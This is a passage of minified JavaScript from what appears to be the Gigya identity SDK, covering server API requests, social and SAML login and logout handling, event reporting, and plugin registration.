            window.gigya.providersConfig.facebook && (window.gigya.logger.info("loading facebook sdk"), f.load(!1)), window.gigya.providersConfig.googlePlus && (window.gigya.logger.info("loading google plus sdk"), p.load());
          });
        });
      }
      function E() {
        return i.__awaiter(this, void 0, void 0, function () {
          var e, t;
          return i.__generator(this, function (n) {
            return e = window.gigya.utils.URL.getParamsFromURL(document.location.href), t = e.gig_ssoToken, "device_sso" === e.scope ? [2, window.gigya.fidm.oidc.op.getContext({
              opKey: window.gigya.partnerSettings.ssoKey,
              sso_token: t
            })] : [2, y.getSsoContext(t)];
          });
        });
      }
      t.parseLang = A, t.parseScriptElement = I, t.initApiAdapter = k, t.autoLogin = C, t.checkReturnFromRedirect = x, t.injectExternalSdks = O;
    }).call(this, n(0).__assign);
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(4),
      o = n(263),
      r = n(6),
      a = n(2),
      s = n(264);
    t.ALLOWED_REPORT_VALUE = "a-zA-Z0-9-_/", t.NOT_ALLOWED_REPORT_CHARS_REGEX = new RegExp("[^" + t.ALLOWED_REPORT_VALUE + "]", "g"), t.queue = [];
    var c;
    function u() {
      t.reports.forEach(function (e) {
        var t;
        null === (t = window.gigya.defaultEventMaps) || void 0 === t || t.push(e.config);
      });
    }
    function l() {
      t.reports.forEach(function (e) {
        s(window.gigya.defaultEventMaps, function (t) {
          return (null == t ? void 0 : t.id) === (null == e ? void 0 : e.id);
        });
      });
    }
    t.reports = [{
      id: o.defaultScreenSetReportID,
      config: o.defaultScreenSetReportConfig
    }], t.registerReports = u, t.removeReports = l, t.replaceNotAllowedReportChars = function (e, n) {
      return e ? e.replace(t.NOT_ALLOWED_REPORT_CHARS_REGEX, n) : "";
    }, u(), c = setInterval(function () {
      if (a.FlagService.stopSendingReports) return l(), clearInterval(c);
      for (; t.queue && t.queue.length > 0;) {
        var e = i.clone(null === t.queue || void 0 === t.queue ? void 0 : t.queue.splice(0, 5), !0, !0);
        try {
          var n = "https://" + window.gigya._.apiDomainFactory()("reports") + "/reports.reportGenericEvents";
          r.Uri.parse(n).addToSearch({
            apiKey: window.gigya.thisScript.APIKey
          }).addToSearch({
            events: JSON.stringify(e)
          }).fetch(0);
        } catch (e) {}
      }
    }, 5e3);
  }, function (e, t, n) {
    (function (e) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var i,
        o,
        r = n(0),
        a = n(4),
        s = n(32),
        c = n(45),
        u = n(96),
        l = n(95),
        d = n(5),
        g = n(27),
        f = n(26),
        p = n(10),
        h = n(35),
        v = n(49),
        y = n(266),
        w = n(2),
        m = n(97);
      function _(e) {
        return {
          status: "OK",
          statusMessage: "",
          errorCode: 0,
          statusCode: 0,
          errorMessage: "",
          errorDetails: "",
          statusReason: "",
          originalResponse: e
        };
      }
      s.add("onFBCRefreshed", function () {
        i = !1;
      }, "component"), function (e) {
        e[e._unknown = 0] = "_unknown", e[e.facebook = 1] = "facebook", e[e.linkedin = 2] = "linkedin", e[e.samlProvider = 3] = "samlProvider", e[e.samlSession = 4] = "samlSession";
      }(o || (o = {}));
      var b = function () {
        function t(e, t, n) {
          void 0 === n && (n = null), this.api = e, this.params = a.merge([a.clone(t), e.settings.defaultParams]), this.originalParams = a.clone(t), this.callback = t.callback, this.riskAssessmentHandler = new y.RiskAssessmentHandlerTimeoutDecorator(n || new y.RiskAssessmentHandler());
        }
        return t.prototype.start = function () {
          var e = this;
          window.gigya._.apiAdapter.isSessionValid(this.params, function (t) {
            return r.__awaiter(e, void 0, void 0, function () {
              var e, n, i;
              return r.__generator(this, function (o) {
                switch (o.label) {
                  case 0:
                    return !this.api.adapterSettings.requiresSession() || t || this.doesHaveAltSessionParam() ? [3, 1] : (window.gigya.logger.debug(this.api.methodName + ": missing required session"), this.afterServerApiResponse(a.clone({
                      status: "FAIL",
                      errorMessage: "Unauthorized user",
                      statusMessage: "Unauthorized user",
                      errorCode: 403005
                    }), !1), [3, 6]);
                  case 1:
                    return window.gigya.logger.debug("server request: " + this.api.methodName, this.params), this.api.adapterSettings.requiresSession() ? [4, window.gigya._.apiAdapter.setGltexpFromSSO(this.params.APIKey)] : [3, 3];
                  case 2:
                    return n = o.sent(), [3, 4];
                  case 3:
                    n = !1, o.label = 4;
                  case 4:
                    return e = n, [4, this.sendRequest(t)];
                  case 5:
                    i = o.sent(), e && 403005 !== i.errorCode && this.dispatchAccountsLoginEvent(i), o.label = 6;
                  case 6:
                    return [2];
                }
              });
            });
          });
        }, t.prototype.sendRequest = function (e) {
          var t = this,
            n = a.merge([this.api.adapterSettings, {
              cacheTimeout: this.params.cacheTimeout,
              forceGigyaDomain: !e && this.api.adapterSettings.forceGigyaDomain
            }]);
          return new gigya.Promise(function (i) {
            t.beforeRequest(e, function (o) {
              if (o) t.afterServerApiResponse(o, e, i);else {
                s.dispatch({
                  eventName: "beforeRequest",
                  methodName: t.api.methodName,
                  rawParams: t.originalParams,
                  params: t.params
                }, t.originalParams);
                var r = t.getMethodUrl();
                t.api.settings.oauth ? window.gigya._.apiAdapter.sendOauthRequest(r, t.params, function (n) {
                  t.afterServerApiResponse(n, e, i);
                }, n) : window.gigya._.apiAdapter.sendRequest(r, t.params, function (n) {
                  t.afterServerApiResponse(n, e, i);
                }, n);
              }
            });
          });
        }, t.prototype.getMethodUrl = function () {
          return this.api.settings.restUrl ? this.constructRestUrl() : this.api.methodName;
        }, t.prototype.constructRestUrl = function () {
          for (var e, t = /({(.*?)})/g, n = t.exec(this.api.settings.restUrl), i = this.api.settings.restUrl; null !== n;) i = i.replace(n[1], null !== (e = this.params[n[2]]) && void 0 !== e ? e : ""), n = t.exec(this.api.settings.restUrl);
          return i;
        }, t.prototype.beforeRequest = function (e, t) {
          var n = this;
          m.logoutMethods[this.api.methodName] && (!e && !this.params.regToken || window.gigya.partnerSettings.ssoLogoutUrl && document.location.href == window.gigya.partnerSettings.ssoLogoutUrl) && t(_(null)), this.handleDeprecatedParams(), this.handleCollections(), this.handleConnectWithoutLoginBehavior(e);
          var i = this.params[this.params.provider + "ExtraPermissions"];
          this.params.extraPermissions = i || this.params.permissions, this.handleRiskAssessment().then(function () {
            n.api.preprocessRequest(n.params, function () {
              n.setOverridableParams(function () {
                n.setNonOverridableParams(e, function () {
                  n.filterParams(n.params), c.logCall(n.api.methodName, n.originalParams, n.originalParams.lastSource), t();
                });
              });
            });
          });
        }, t.prototype.setOverridableParams = function (e) {
          a.merge([{}, this.params]), e();
        }, t.prototype.doesHaveAltSessionParam = function () {
          if (this.api.altSessionParams) {
            for (var e = this.api.altSessionParams.split("|"), t = 0; t < e.length; t++) if (this.params[e[t]]) return !0;
            return !1;
          }
        }, t.prototype.setNonOverridableParams = function (e, t) {
          if (null != this.params.APIKey) {
            var n = window.gigya._.apiAdapter.getStorage().getItem("gltexp_" + this.params.APIKey);
            null != n && (this.params.loginTokenExp = n);
          }
          var o = window.gigya._.apiAdapter.getStorage().getItem("_gigRefUid_" + this.params.APIKey);
          if (o && (e || m.loginMethods[this.api.methodName]) && (this.params.refUID = o), window.gigya.providersConfig.facebook && !i) {
            var r = u.getParams();
            for (var a in r) this.params[a] = r[a];
            i = !0;
          }
          0 === this.api.methodName.indexOf("accounts.") && (s._activeNamespaces.socialize && null == this.params.includeUserInfo && (this.params.includeUserInfo = !0), this.params.include = this.params.include ? this.params.include + "," : "profile,data"), "accounts.getSchema" === this.api.methodName && (this.params.includeDynamicSchema = "clientOnly"), this.params.targetEnv = "jssdk", t();
        }, t.prototype.handleDeprecatedParams = function () {
          this.params.pendingRegistration ? this.params.pending_registration = this.params.pendingRegistration : this.params.newUsersPendingRegistration && (this.params.pending_registration = this.params.newUsersPendingRegistration), this.params.alwaysForceAuthentication && (this.params.forceAuthentication = !0), this.params.timestamp && (this.params.UIDTimestamp = this.params.timestamp, delete this.params.timestamp), this.params.signature && 0 === this.api.methodName.indexOf("socialize.") && (this.params.UIDSig = this.params.signature, delete this.params.signature), this.params.nonce && (this.params.UIDNonce = this.params.nonce, delete this.params.nonce), this.params.format && !this.params.dataFormat && (this.params.dataFormat = this.params.format, delete this.params.format);
        }, t.prototype.handleRiskAssessment = function () {
          var t;
          return r.__awaiter(this, void 0, void 0, function () {
            var n;
            return r.__generator(this, function (i) {
              switch (i.label) {
                case 0:
                  return (null === (t = this.api.settings) || void 0 === t ? void 0 : t.riskAssessment) ? [4, this.riskAssessmentHandler.getAssessmentParameters(this.params)] : [2];
                case 1:
                  return n = i.sent(), e(this.params, n), [2];
              }
            });
          });
        }, t.prototype.handleCollections = function () {
          if (this.params.recipients && (this.params.recipients = this.extractListOfGIGUIDs(this.params.recipients)), this.params.friends) {
            var e = this.extractListOfGIGUIDs(this.params.friends);
            this.params.UIDs.length > 0 && (this.params.UIDs += ","), this.params.UIDs += e;
          }
        }, t.prototype.extractListOfGIGUIDs = function (e) {
          var t = this;
          switch (typeof e) {
            case "string":
              return e;
            case "object":
              if (void 0 !== e.UID) return e.UID;
              if (e instanceof window.gigya.socialize.Collection) {
                var n = [];
                return e.each(function (e, i) {
                  var o = t.extractListOfGIGUIDs(e);
                  null != o && "" != o && n.push(o);
                }), n.join(",");
              }
          }
        }, t.prototype.handleConnectWithoutLoginBehavior = function (e) {
          if ("socialize.addConnection" === this.api.methodName) {
            var t = this.params.connectWithoutLoginBehavior;
            "string" == typeof t && (t = t.toLowerCase()), "loginexistinguser" === t && (this.params.loginIfExists = !0), e || (this.api = l.getApi("socialize.login"), "alwayslogin" !== t && (this.params.temporary_account = !0));
          }
        }, t.prototype.filterParams = function (e) {
          this.params = a.extractProperties(e, {}, this.getFullSchema());
        }, t.prototype.getFullSchema = function () {
          if (null == this.api.schema) return "";
          var e = (this.api.schema + "|" + m.defaultApiSchema).split("|");
          -1 === e.indexOf("context") && "string" == typeof this.params.context && e.push("context");
          for (var t = 0; t < e.length; t++) {
            var n = e[t];
            if (-1 !== n.toLowerCase().indexOf("[providercapability=")) {
              for (var i = n.toLowerCase().split("=")[1].split("]")[0], o = n.split("]")[1], r = window.gigya.socialize.getProvidersForRequiredCapabilities(window.gigya.socialize.getProvidersByName("*"), [i]), a = [], s = 0; s < r.length; s++) a.push(r[s].name + o);
              e[t] = a.join("|");
            }
          }
          return e.join("|");
        }, t.prototype.preprocessServerResponse = function (e) {
          e.userInfo && 0 !== this.api.methodName.indexOf("accounts.") && ("string" == typeof e.userInfo && (e.userInfo = d.parse(e.userInfo, void 0)), e.userInfo && ((e = a.merge([e.userInfo, e])).errorCode = e.userInfo.errorCode, delete e.userInfo)), e.accountInfo && "string" == typeof e.accountInfo && (e.accountInfo = d.parse(e.accountInfo, void 0), e.accountInfo && delete (e = a.merge([e.accountInfo, e])).accountInfo);
          try {
            e.settings && "string" == typeof e.settings && (e.settings = d.parse(e.settings));
          } catch (e) {}
          return e;
        }, t.prototype.getExpiredSessionResponse = function (e) {
          switch (this.api.methodName) {
            case "socialize.delUserSettings":
              this.originalParams.disableLocalSettings || (g.delGigyaSettings(this.params.group), e = _(e));
              break;
            case "socialize.getUserInfo":
              e.status = "OK", e.statusMessage = "", e.errorCode = 0, e.statusCode = 0, e.errorMessage = "", e.errorDetails = "", e.statusReason = "";
              break;
            case "accounts.logout":
            case "socialize.logout":
              e = _(e);
          }
          return e;
        }, t.prototype.afterServerApiResponse = function (e, t, n) {
          var i = this;
          isNaN(Number(window.gigya.thisScript.globalConf.verifyLoginInterval)) || "accounts.verifyLogin" !== this.api.methodName || 0 === e.errorCode || window.gigya._.apiAdapter.clearSession({
            APIKey: window.gigya.thisScript.APIKey
          }), g.checkCompleteRegistration(e, this.originalParams, this.api.methodName, function (o, r, a) {
            e = o, 403005 == (e = i.preprocessServerResponse(e)).errorCode && (e = i.getExpiredSessionResponse(e)), 0 == e.errorCode && (t || m.loginMethods[i.api.methodName]) && window.gigya._.apiAdapter.getStorage().removeItem("_gigRefUid_" + i.originalParams.APIKey), i.handleMethodResponse(e, function (o) {
              e = o, i.addDefaultResponseProperties(e), g.handleSpecialFields(e), i.logoutFromProvidersIfNeeded(e, function (o) {
                if (o) i.sendRequest(t).then(n);else {
                  if (r || (i.generateEventsFromResponse(e, t), i.generateInterruptionEventFromResponse(e)), a) return window.gigya.logger.info("retrying request"), void i.sendRequest(t).then(n);
                  if (s.dispatch({
                    eventName: "afterResponse",
                    methodName: i.api.methodName,
                    filteredParams: i.params,
                    response: e
                  }, i.originalParams), "function" == typeof i.callback) {
                    c.addLog("Calling callback for " + i.api.methodName + " with this response object", e);
                    try {
                      i.callback(e);
                    } catch (e) {
                      console.error(e);
                    }
                  }
                  i.api.settings.postprocessor && i.api.settings.postprocessor(i.originalParams, e), n && n(e);
                }
              });
            });
          });
        }, t.prototype.addDefaultResponseProperties = function (e) {
          delete e.statusCode, delete e.statusReason, e.errorCode = e.errorCode || 0, e.status = e.status || (0 == e.errorCode ? "OK" : "FAIL"), e.errorMessage = e.errorMessage || "", e.statusMessage = e.statusMessage || e.errorMessage, e.requestParams = this.originalParams, e.requestParams.password && delete e.requestParams.password, e.context = this.originalParams.context;
          var t = this.api.methodName.split(".")[0];
          e.operation = "socialize" == t ? this.api.methodName.split(".")[1] : "/" + this.api.methodName;
        }, t.prototype.handleMethodResponse = function (e, t) {
          if (0 == e.errorCode) switch (this.api.methodName) {
            case "accounts.socialLogin":
            case "socialize.login":
              e.newUser = "true" == String(e.x_newUser), delete e.x_newUser;
            case "socialize.notifyLogin":
            case "socialize.addConnection":
            case "accounts.linkAccounts":
            case "accounts.finalizeRegistration":
            case "accounts.login":
            case "oauth.token":
            case "accounts.sso.login":
            case "accounts.otp.login":
            case "accounts.auth.magiclink.email.login":
            case "accounts.auth.otp.email.login":
            case "accounts.auth.login":
            case "accounts.register":
            case "socialize.getUserInfo":
              if (delete e.login_token, delete e.expires_in, delete e.id, e.code && (e.authCode = e.code, delete e.code), !(e.authCode || "socialize.notifyLogin" == this.api.methodName && this.params.authCode)) {
                var n = e;
                if (e.userInfo && (n = e.userInfo, delete e.userInfo), -1 == this.api.methodName.indexOf("accounts.") ? (e = {
                  user: n
                }, a.extractProperties(n, e, "status|statusMessage|callId|errorCode|errorMessage|errorDetails|settings|context|UIDSig|timestamp|UIDSignature|signatureTimestamp|UID|profile|data|newUser|signKeysUIDSignature|dataCenter|id_token"), e.user.hasOwnProperty("UIDSig") && (e.signature = e.user.UIDSig), n.profile && delete n.profile, n.data && delete n.data, delete n.status, delete n.statusMessage, delete n.callId, delete n.errorCode, delete n.errorMessage, delete n.errorDetails, delete n.settings, delete n.context) : e != n && (e.user = n), "" == n.age || isNaN(parseInt(n.age)) || (n.age = parseInt(n.age)), n.suppressEvents && (e.suppressEvents = !0), "string" == typeof n.capabilities) {
                  var i = n.capabilities;
                  i || (i = ""), "object" != typeof n.capabilities && (n.capabilities = {}), i = i.toLowerCase(), n.capabilities = {
                    actions: i.indexOf("actions") > -1,
                    friends: i.indexOf("friends") > -1,
                    login: i.indexOf("login") > -1,
                    status: i.indexOf("status") > -1,
                    notifications: i.indexOf("notifications") > -1,
                    contacts: i.indexOf("contacts") > -1,
                    photos: i.indexOf("photos") > -1
                  };
                }
                if (g.convertIdentitiesArrayToObject(n), "string" == typeof n.providers && (n.providers = n.providers.split(",")), this.params.group && !e.settings) {
                  var o = g.getGigyaSettings(this.params.group);
                  e.settings = o;
                }
              }
              break;
            case "socialize.getAvailableProviders":
              for (var r = {}, s = 0; s < e.availableProviders.length; s++) r[e.availableProviders[s].name] = e.availableProviders[s];
              e.availableProviders = r;
          }
          "socialize.removeConnection" === this.api.methodName && 0 == e.errorCode ? window.gigya.socialize.getUserInfo(this.originalParams, {
            callback: function (e) {
              t(e);
            }
          }) : t(e);
        }, t.prototype.logoutFromProvidersIfNeeded = function (e, t) {
          var n = e.errorCode;
          if (m.logoutMethods[this.api.methodName] && 0 == n) {
            e.logoutActiveSession && window.gigya._.apiAdapter.clearSession(this.params.APIKey);
            var i,
              r = new Array(),
              a = 5e3,
              s = 0;
            if (e.connectedProviders ? i = e.connectedProviders.toLowerCase() : e.provider && (i = e.provider.toLowerCase()), i && !f.isExplicitFalse(this.originalParams.forceProvidersLogout)) for (var c = i.split(","), u = 0; u < c.length; ++u) {
              var l = c[u],
                d = o[l],
                g = null,
                p = 5e3;
              0 === l.indexOf("saml-") && (d = o.samlProvider, g = l.substring("saml-".length), p = !1, a = 1e4, s = 5e3), r.push({
                type: d,
                data: g,
                removeAfter: p
              });
            }
            if (e.samlContext && e.connectedSamlSessions) {
              var h = e.samlContext,
                v = e.connectedSamlSessions.split(",");
              for (u = 0; u < v.length; ++u) r.push({
                type: o.samlSession,
                data: {
                  samlContext: h,
                  samlSession: v[u]
                },
                removeAfter: !1
              }), a = 1e4, s = 5e3;
            }
            if (r.length) {
              var y = 0,
                w = !1,
                _ = function () {
                  w || (w = !0, t(!1));
                };
              window.setTimeout(_, a);
              var b = function () {
                ++y === r.length && window.setTimeout(_, s);
              };
              for (u = 0; u < r.length; u++) this.logoutFromProvider(r[u], b);
            } else t(!1);
          } else 403013 == e.errorCode && "accounts.verifyLogin" !== this.api.methodName ? window.gigya.accounts.verifyLogin({
            ignoreApiQueue: this.originalParams.ignoreApiQueue,
            callback: function (e) {
              0 == e.errorCode ? t(!0) : t(!1);
            }
          }) : t(!1);
        }, t.prototype.logoutFromProvider = function (e, t) {
          var n = "",
            i = !1,
            r = !0,
            a = "" + window.gigya._.getApiDomain("fidm");
          switch (e.type) {
            case o.facebook:
              if (window.gigya.providersConfig.facebook) return void window.gigya.socialize.waitForService({
                service: "facebook",
                callback: function () {
                  u.isLoggedIn && FB.logout ? FB.logout(function () {
                    u.refreshSession(), window.gigya._.apiAdapter.getStorage().removeItem("fblo_" + window.gigya.providersConfig.facebook.appID), t();
                  }) : t();
                }
              });
              break;
            case o.samlProvider:
              n = p.addParamsToURL("https://" + a + "/saml/v2.0/" + this.params.APIKey + "/sp/jsslo", {
                name: e.data
              }), i = !0, r = !1;
              break;
            case o.samlSession:
              n = p.addParamsToURL("https://" + a + "/saml/v2.0/" + this.params.APIKey + "/idp/slo/continue/", e.data), i = !0, r = !1;
          }
          if (n) {
            r && (n += new Date().getTime());
            var s,
              c = i ? h.ResourceTypes.iframe : h.ResourceTypes.image;
            s = e.removeAfter, h.triggerResource(n, t, c, s);
          } else t();
        }, t.prototype.generateEventsFromResponse = function (e, t) {
          var n,
            i,
            o = this;
          if (0 == e.errorCode) switch (this.api.methodName) {
            case "accounts.logout":
            case "socialize.logout":
            case "socialize.unlinkAccounts":
            case "socialize.deleteAccount":
              i = {
                eventName: "logout,accounts.logout"
              };
              break;
            case "socialize.linkAccounts":
            case "socialize.setUID":
              g.addUserInfoToEvent(e, i, !0);
              break;
            case "socialize.removeConnection":
              i = {
                eventName: "connectionRemoved,disconnect",
                provider: this.params.provider || ""
              }, g.addUserInfoToEvent(e, i);
              break;
            case "socialize.addConnection":
              !t && e.user.isLoggedIn ? (i = {
                eventName: "login",
                provider: this.params.provider
              }, g.addUserInfoToEvent(e, i, !0)) : (i = {
                eventName: "connectionAdded,connect",
                provider: this.params.provider
              }, g.addUserInfoToEvent(e, i));
              break;
            case "accounts.linkAccounts":
            case "accounts.finalizeRegistration":
            case "accounts.login":
            case "oauth.token":
            case "accounts.otp.login":
            case "accounts.auth.magiclink.email.login":
            case "accounts.auth.otp.email.login":
            case "accounts.auth.login":
            case "accounts.register":
            case "accounts.socialLogin":
              this.originalParams.suppressLoginEvent || this.dispatchAccountsLoginEvent(e);
            case "socialize.finalizeRegistration":
            case "socialize.register":
            case "socialize.login":
              if (!e.user && !e.authCode) break;
              i = {
                eventName: "login"
              };
              var r = null === (n = this.params) || void 0 === n ? void 0 : n.provider;
              if (!r && e.providerSessions) for (var a in e.providerSessions) {
                r = a;
                break;
              }
              i.provider = this.getSocialProviders(r, e), i.loginMode = this.originalParams.loginMode || "standard", i.newUser = e.newUser || !1, e.authCode && (i.authCode = e.authCode), g.addUserInfoToEvent(e, i, !0), e.user && r && (r = r.toLowerCase(), this.setSocialCookies(r, e.user.firstName));
              break;
            case "socialize.notifyLogin":
              this.params.authCode ? i = {
                eventName: "login"
              } : (i || (i = {
                eventName: "login"
              }), i.provider = "site", g.addUserInfoToEvent(e, i, !0));
              break;
            case "gm.notifyAction":
              s.dispatch({
                eventName: "actionNotified",
                isInternal: !0
              });
              break;
            case "accounts.sso.login":
              window.gigya._.apiAdapter.syncSsoLogin(e.context);
          }
          m.loginMethods[this.api.methodName] && this.originalParams.redirectURL && i && i.user && 0 == e.errorCode && v.redirect(this.originalParams.redirectURL, [i, i.user], this.originalParams.redirectMethod), 0 == e.errorCode && i && "login" === i.eventName && !e.profile && s._activeNamespaces.accounts && -1 === this.api.methodName.indexOf("accounts") && window.gigya.accounts.getAccountInfo(this.originalParams, {
            include: "profile,data",
            includeUserInfo: !1,
            callback: function (e) {
              o.originalParams.suppressLoginEvent || o.dispatchAccountsLoginEvent(e);
            }
          }), !i || "login" === i.eventName && this.originalParams.suppressLoginEvent || (i.context = this.originalParams.context, s.dispatch(i, this.originalParams));
        }, t.prototype.generateInterruptionEventFromResponse = function (e) {
          var t = {};
          switch (e.errorCode) {
            case 206001:
              t.eventName = "accounts.pendingRegistration", t.regToken = e.regToken, t.loginProvider = e.loginProvider;
              break;
            default:
              return;
          }
          t.sourceRequest = this.api.methodName, t.errorCode = e.errorCode, t.errorMessage = e.errorMessage, t.errorDetails = e.errorDetails, e.userInfo && g.addUserInfoToEvent(e, t), this.originalParams.context && (t.context = this.originalParams.context), s.dispatch(t, this.originalParams);
        }, t.prototype.setSocialCookies = function (e, t) {
          void 0 === t && (t = ""), w.FlagService.setCookieSameSiteLaxSocial ? (window.gigya._.apiAdapter.getStorage().setItem("_gig_llp", e, null, null, {
            sameSite: "Lax"
          }), window.gigya._.apiAdapter.getStorage().setItem("_gig_llu", t, null, null, {
            sameSite: "Lax"
          })) : (window.gigya._.apiAdapter.getStorage().setItem("_gig_llp", e), window.gigya._.apiAdapter.getStorage().setItem("_gig_llu", t));
        }, t.prototype.dispatchAccountsLoginEvent = function (e) {
          var t = {
            eventName: "accounts.login",
            remember: f.isExplicitTrue(this.originalParams.remember),
            provider: this.getProviderName(e),
            loginMode: this.originalParams.loginMode || "standard"
          };
          a.extractProperties(e, t, "newUser|signature|UIDSig|timestamp|UIDSignature|signatureTimestamp|UID|profile|data|signKeysUIDSignature|dataCenter|id_token|password"), w.FlagService.magicLinkDispatchLoginWhenAdded && "accounts.auth.magiclink.email.login" === this.api.methodName ? s.dispatchWhenHandlerAdded(t, this.originalParams) : s.dispatch(t, this.originalParams);
        }, t.prototype.getProviderName = function (e) {
          var t = this.originalParams.provider ? this.originalParams.provider.toLowerCase() : "",
            n = e.loginProvider || "";
          return t !== n && window.gigya.logger.report("provider mismatch", {
            currentProvider: t,
            loginProvider: n
          }), w.FlagService.setProviderFromResponse && n ? n : t;
        }, t.prototype.getSocialProviders = function (e, t) {
          return w.FlagService.setProviderFromResponse && t ? e || t.socialProviders || "site" : e || "site";
        }, t;
      }();
      t.ServerApiRequest = b;
    }).call(this, n(0).__assign);
  },,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, function (e, t, n) {
    (function (e) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      }), n(236), n(158);
      var i = n(96),
        o = n(113),
        r = n(151),
        a = n(157),
        s = n(265),
        c = n(97),
        u = n(123),
        l = n(159),
        d = n(271);
      window.gigya._ || (window.gigya._ = {}), window.gigya._.bootstrap || (window.gigya._.bootstrap = {}), window.gigya._.sso || (window.gigya._.sso = {}), window.gigya.external || (window.gigya.external = {}), window.gigya.external.facebook || (window.gigya.external.facebook = {}), window.gigya.external.googlePlus || (window.gigya.external.googlePlus = {}), window.gigya.external.opengraph || (window.gigya.external.opengraph = {}), e(window.gigya._, s, c, u, l, d), e(window.gigya._.bootstrap, a), e(window.gigya.external.facebook, i), e(window.gigya.external.googlePlus, o), e(window.gigya.external.opengraph, r), window.gigya.build || (window.gigya.build = {
        version: "",
        number: 0
      }), window.gigya.providersConfig || (window.gigya.providersConfig = {}), window.gigya.isGigya || (window.gigya.isGigya = !0), window.gigya.partnerSettings || (window.gigya.partnerSettings = {
        authMode: "cookie",
        baseDomains: "",
        captchaProvider: "Google",
        plugins: {
          apiDomain: "us1.gigya-api.com"
        },
        invisibleRecaptcha: {
          siteKey: ""
        },
        recaptchaV2: {
          siteKey: ""
        },
        funCaptcha: {
          siteKey: ""
        }
      }), a.init();
    }).call(this, n(0).__assign);
  }, function (e, t, n) {
    (function (e) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var i = n(0);
      n(73);
      var o = n(237),
        r = n(21),
        a = n(238),
        s = n(59),
        c = n(32),
        u = n(239),
        l = n(240),
        d = n(27),
        g = n(45),
        f = n(3),
        p = n(146),
        h = n(112),
        v = n(94),
        y = n(241),
        w = n(95),
        m = n(147),
        _ = n(149),
        b = n(242),
        S = n(148),
        P = n(243),
        A = n(150),
        I = n(76),
        k = n(244),
        C = n(247),
        x = n(248),
        O = n(249),
        E = n(50),
        T = n(250),
        L = n(251);
      n(252), n(253), n(154), n(254), n(157), n(262), n(66);
      var D = n(52);
      window.gigya._ || (window.gigya._ = {}), window.gigya.events || (window.gigya.events = {}), window.gigya.events.global || (window.gigya.events.global = {}), window.gigya.log || (window.gigya.log = {}), window.gigya._.providers || (window.gigya._.providers = {}), window.gigya.legacyReports || (window.gigya.legacyReports = {}), window.gigya._.apiAdapters || (window.gigya._.apiAdapters = {}), window.gigya._.plugins || (window.gigya._.plugins = _), window.gigya._.UI || (window.gigya._.UI = {}), window.gigya._.api || (window.gigya._.api = {}), window.gigya._.saml || (window.gigya._.saml = {}), window.gigya.fidm || (window.gigya.fidm = {}), window.gigya.fidm.saml || (window.gigya.fidm.saml = {}), window.gigya.fidm.oidc || (window.gigya.fidm.oidc = {}), window.gigya.fidm.oidc.op || (window.gigya.fidm.oidc.op = {}), window.gigya.services || (window.gigya.services = {}), window.gigya.globalAccount || (window.gigya.globalAccount = {}), e(window.gigya, o, u, l, f, y, a, {
        Promise: gigya.Promise
      }, {
        flow: L.flow
      }), e(window.gigya._, r, d, w, m, P, A, I, k, {
        passkeyService: D.default
      }), e(window.gigya.events, s), e(window.gigya.events.global, c), e(window.gigya.log, g), e(window.gigya._.providers, p), e(window.gigya.legacyReports, h), e(window.gigya._.apiAdapters, v), e(window.gigya._.UI, b), e(window.gigya._.api, S), e(window.gigya._.saml, C), e(window.gigya.fidm.saml, x), e(window.gigya.fidm.oidc.op, i.__assign({}, Object.getPrototypeOf(T.op))), e(window.gigya.services, O, E);
    }).call(this, n(0).__assign);
  }, function (e, t) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    }), t.isReady = !1;
  }, function (e, t) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    }), t.defaultEventMaps = window.gigya.defaultEventMaps || [];
  }, function (e, t) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
  }, function (e, t) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
  }, function (e, t) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(17),
      o = n(9);
    t.registerPlugin = function (e) {
      i.queueForExecution("UI", e);
    }, t.attachPlugin = function (e, t, n, i) {
      t || (t = "socialize"), window.gigya[t] || (window.gigya[t] = {}), window.gigya[t].plugins || (window.gigya[t].plugins = {}), window.gigya[t].plugins[n] || (window.gigya[t].plugins[n] = {
        instances: []
      });
      var r = window.gigya[t].plugins[n];
      if (r[i] || (r[i] = function (i) {
        var o = "gigya." + t + ".plugins." + n + ".instances[" + r.instances.length + "]",
          a = new e(i, o);
        r.instances.push(a);
      }), e.StaticApi) for (var a in e.StaticApi) {
        var s = e.StaticApi[a],
          c = e[s];
        o.createAlias("gigya." + t + ".plugins." + n + "." + a, c);
      }
    };
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(59),
      o = n(18),
      r = n(150),
      a = n(32),
      s = n(4),
      c = function () {
        function e(t, n, o) {
          for (var r in void 0 === o && (o = !0), this.params = t, this.explicitParams = n, this._logger = window.gigya.logger, this._eventDispatcher = function (e, t) {
            return i.dispatchForWidget(e, t);
          }, this._errorDispatcher = window.gigya.events, this._globalEventsManager = window.gigya.events.global, this._isDisposed = !1, this._eventWrappers = {}, this._globalEventHandlers = {}, this._id = ++e.instanceCounter, this.params = t ? s.clone(t) : {}, this.explicitParams = n ? s.clone(n) : {}, o && this.validateParams(), t) e[r] && (e[r] = t[r]);
        }
        return e.prototype.onErrorEvent = function () {
          return this.getEvent("onError");
        }, e.prototype.onDisposedEvent = function () {
          return this.getEvent("onDisposed");
        }, e.prototype.dispatchGlobalEvent = function (e) {
          a.dispatch(e);
        }, e.prototype.getType = function () {
          return this.constructor.name || this.getFunctionName(this.constructor);
        }, e.prototype.getFunctionName = function (e) {
          var t = e.toString();
          return t = (t = t.substr("function ".length)).substr(0, t.indexOf("("));
        }, e.prototype.getConfig = function () {
          return this.error(e.NOT_IMPLEMENTED_ERROR, 400096), {};
        }, e.prototype.toString = function () {
          return this.getType() + " " + this.id();
        }, e.prototype.id = function () {
          return this._id;
        }, e.prototype.warn = function (e, t) {
          var n = this.id() + " " + this.getType() + " - " + e;
          this._logger.info(n, t);
        }, e.prototype.error = function (e, t, n) {
          void 0 === t && (t = 300001);
          var i = {
            errorMessage: e,
            errorCode: t,
            errorDetails: this.id(),
            info: n
          };
          this.warn(e, i), this.dispatchEvent("error", i);
